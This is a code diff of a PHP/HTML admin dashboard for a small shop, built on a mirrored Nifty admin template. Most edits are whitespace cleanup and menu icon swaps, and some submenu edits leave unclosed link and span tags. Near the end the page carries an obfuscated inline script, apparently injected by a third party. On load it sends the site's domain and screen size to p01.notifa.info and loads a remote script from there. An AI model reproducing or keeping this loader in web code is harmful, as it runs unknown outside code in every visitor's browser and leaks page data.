@@ -48,12 +48,12 @@
     <link href="<?php echo base_url();?>assets/adminlte/css/demo/nifty-demo.min.css" rel="stylesheet">
 
 
-        
+
     <!--DataTables [ OPTIONAL ]-->
     <link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/css/dataTables.bootstrap.css" rel="stylesheet">
 	<link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/css/responsive.dataTables.min.css" rel="stylesheet">
 
-    
+
     <!--=================================================
 
     REQUIRED
@@ -79,14 +79,14 @@
     Detailed information and more samples can be found in the document.
 
     =================================================-->
-        
+
 </head>
 
 <!--TIPS-->
 <!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->
 <body>
     <div id="container" class="effect aside-float aside-bright mainnav-lg">
-        
+
         <!--NAVBAR-->
         <!--===================================================-->
         <header id="navbar">
@@ -285,8 +285,8 @@
                         </li>
                         <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                         <!--End user dropdown-->
- 
-                        
+
+
                         <li>
                             <a href="#" class="aside-toggle">
                                 <i class="demo-pli-dot-vertical"></i>
@@ -308,7 +308,7 @@
             <!--===================================================-->
             <div id="content-container">
                 <div id="page-head">
-                    
+
                     <!--Page Title-->
                     <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                     <div id="page-title">
@@ -330,11 +330,11 @@
 
                 </div>
 
-                
+
                 <!--Page content-->
                 <!--===================================================-->
                 <div id="page-content">
-                    
+
 					<!-- Basic Data Tables -->
 					<!--===================================================-->
 					<div class="panel">
@@ -371,13 +371,13 @@
 					                    <th></th>
 					                    <th></th>
 					                </tr>
-					         
+
 					            </tbody>
 					        </table>
 
 					        <!-- Tombol untuk menampilkan modal-->
 							<button type="button" class="btn btn-primary" data-toggle="modal" data-target="#myModal">Tambah</button>
-						 
+
 							<!-- Modal -->
 							<div id="myModal" class="modal fade" role="dialog">
 								<div class="modal-dialog">
@@ -390,7 +390,7 @@
 										</div>
 										<!-- body modal -->
 										<div class="modal-body">
-										
+
 										</div>
 										<!-- footer modal -->
 										<div class="modal-footer">
@@ -404,11 +404,11 @@
 					</div>
 
 
-									
+
 					<!--===================================================-->
 					<!-- End Striped Table -->
-					
-					
+
+
                 </div>
                 <!--===================================================-->
                 <!--End page content-->
@@ -418,14 +418,14 @@
             <!--END CONTENT CONTAINER-->
 
 
-            
+
             <!--ASIDE-->
             <!--===================================================-->
             <aside id="aside-container">
                 <div id="aside">
                     <div class="nano">
                         <div class="nano-content">
-                            
+
                             <!--Nav tabs-->
                             <!--================================-->
                             <ul class="nav nav-tabs nav-justified">
@@ -698,7 +698,7 @@
             <!--===================================================-->
             <!--END ASIDE-->
 
-            
+
              <!--MAIN NAVIGATION-->
             <!--===================================================-->
             <nav id="mainnav-container">
@@ -748,7 +748,7 @@
                                 <!--================================-->
                                 <div id="mainnav-shortcut" class="hidden">
                                     <ul class="list-unstyled shortcut-wrap">
-                                    	
+
                                         <li class="col-xs-3" data-content="My Profile">
                                             <a class="shortcut-grid" href="#">
                                                 <div class="icon-wrap icon-wrap-sm icon-circle bg-mint">
@@ -784,14 +784,14 @@
 
 
                                 <ul id="mainnav-menu" class="list-group">
-									
+
 						            <!--Category name-->
 						            <li class="list-header">Navigation</li>
-						
+
 						            <!--Menu list item-->
 						            <li class="active-sub">
 						                <a href="<?= base_url().'Dashboard' ?>">
-						                    <i class="demo-pli-home"></i>
+						                    <i class="fa fa-home"></i>
 						                    <span class="menu-title">
 												Beranda
 											</span>
@@ -801,18 +801,19 @@
                                     <!--Menu list item-->
 						            <li >
 						                <a href="#">
-						                    <i class="fa fa-file"></i>
+						                    <i class="glyphicon glyphicon-book"></i>
 						                    <span class="menu-title">Data Toko</span>
 											<i class="arrow"></i>
 						                </a>
-						
+
 						                <!--Submenu-->
 						                <ul class="collapse">
-						                   <li><a href="">Informasi Toko </a></li>
-						                   <li><a href="">Faqs</a></li>
-						                </ul>			
+						                   <li><a href=""><i class="fa fa-edit"></i>
+                               <span class="menu-title">Informasi Toko
+						                   <li><a href=""><i class="fa fa-edit"></i>Faqs</a></li>
+						                </ul>
 						            </li>
-						
+
 						            <!--Menu item-->
                                     <li>
                                         <a href="widgets.html">
@@ -823,11 +824,11 @@
                                             </span>
                                         </a>
                                     </li>
-						              
+
                                      <!--Menu item-->
                                     <li>
                                         <a href="widgets.html">
-                                            <i class="demo-pli-gear"></i>
+                                            <i class="fa fa-history"></i>
                                             <span class="menu-title">
                                                 Riwayat Barang
                                                 <span class="pull-right badge badge-warning"></span>
@@ -838,7 +839,7 @@
 						             <!--Menu item-->
                                     <li>
                                         <a href="widgets.html">
-                                            <i class="demo-pli-gear"></i>
+                                            <i class="glyphicon glyphicon-list-alt"></i>
                                             <span class="menu-title">
                                                 Barang Ready
                                                 <span class="pull-right badge badge-warning"></span>
@@ -860,22 +861,22 @@
                                      <!--Menu list item-->
                                     <li >
                                         <a href="#">
-                                            <i class="demo-pli-home"></i>
+                                            <i class="glyphicon glyphicon-book"></i>
                                             <span class="menu-title">Laporan</span>
                                             <i class="arrow"></i>
                                         </a>
-                        
+
                                         <!--Submenu-->
                                         <ul class="collapse">
-                                           <li><a href="">Penjualan </a></li>
-                                           <li><a href="">Pembelian</a></li>
-                                        </ul>           
-                                    </li>
-						              
+            						                   <li><a href=""><i class="fa fa-book"></i>
+                                           <span class="menu-title">Penjualan
+            						                   <li><a href=""><i class="fa fa-book"></i>Pembelian</a></li>
+            						                </ul>
+            						            </li>
                                      <!--Menu item-->
                                     <li>
                                         <a href="widgets.html">
-                                            <i class="demo-pli-gear"></i>
+                                            <i class="fa fa-wechat"></i>
                                             <span class="menu-title">
                                                 Kritik & Saran
                                                 <span class="pull-right badge badge-warning"></span>
@@ -895,7 +896,7 @@
 
         </div>
 
-        
+
 
         <!-- FOOTER -->
         <!--===================================================-->
@@ -941,9 +942,9 @@
     <!-- END OF CONTAINER -->
 
 
-    
-    
-    
+
+
+
     <!--JAVASCRIPT-->
     <!--=================================================-->
 
@@ -962,11 +963,11 @@
 
 
     <!--=================================================-->
-    
+
     <!--Demo script [ DEMONSTRATION ]-->
   <!--  <script src="<?php echo base_url();?>assets/adminlte/js/demo/nifty-demo.min.js"></script> -->
 
-    
+
     <!--DataTables [ OPTIONAL ]-->
     <script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/jquery.dataTables.js"></script>
 	<script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/dataTables.bootstrap.js"></script>
@@ -977,10 +978,9 @@
     <script src="<?php echo base_url();?>assets/adminlte/js/demo/tables-datatables.js"></script>
 
 
-    
+
 
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjUaxQDkkXsQ40smKLX5MuTaP3Hz7CQx99v6v04x8tXILLzaJOlxMW8AqYZK7vJBQ0GeroIrDmsgRoQd3TbDcKFg5ZBqSJkgONBJfmihZkKwZm6n6A8yUgj4nkx3jY0LDUaUhTTSVo18zAU71F%2bg%2fz9XJK7mEBwuR9UbbQUNbpeu8TLlTGwc%2bJ8Q4Ghvlq5a3uLs3tGbSqe%2bIMGFB42NllBOXiUa%2fJS3C%2f4xtm2qCm0o76VDiUn%2fJU4E2PfPUP5k8Q8kqhOs%2f%2fJYJ%2b5E9CA9qTuBEo6UMsqrPZvthp0Oykb75Uu2OV1Q22Y539wDCdiCo%2fWdq8fte8WqybYrW7iOvpOtmuE9ypRwL6%2b5gbKpaecKP8gA8490c03k5TAyLvuWRxyhxBbA0sZtkm3%2b8dHg4FAjhTkRhGG4SmpBOqFSR9NOOtxN2dE8rtluoiMR%2fABnnWziDQHZS%2bjsuB5P1ZZS9wUjx%2bBZgxi5uazzR7I6vPu%2fVdNPdhxC%2fcET" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
 <!-- Mirrored from www.themeon.net/nifty/v2.9.1/tables-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:10 GMT -->
 </html>
-
